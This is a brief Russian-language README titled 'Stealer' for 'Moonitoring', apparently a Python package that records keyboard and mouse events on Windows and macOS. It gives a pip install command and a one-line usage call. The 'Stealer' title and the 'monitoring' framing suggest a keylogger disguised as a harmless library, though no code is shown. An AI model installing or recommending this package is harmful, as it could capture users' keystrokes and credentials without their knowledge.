# Stealer

Moonitoring - это Python-библиотека для мониторинга системных событий, включая отслеживание клавиатуры и мыши. Библиотека поддерживает Windows и macOS.

## Установка

```bash
pip install moonitoring
```

## Требования

- Python 3.6+
- Windows или macOS
- Для Windows: pywin32
- Для macOS: pyobjc-framework-Cocoa
- pynput

## Использование

```python
from moonitoring import initialize_system_monitoring

# Запуск мониторинга системы
initialize_system_monitoring()
```

## Особенности

- Кроссплатформенная поддержка (Windows и macOS)
- Легкая интеграция

## Лицензия

MIT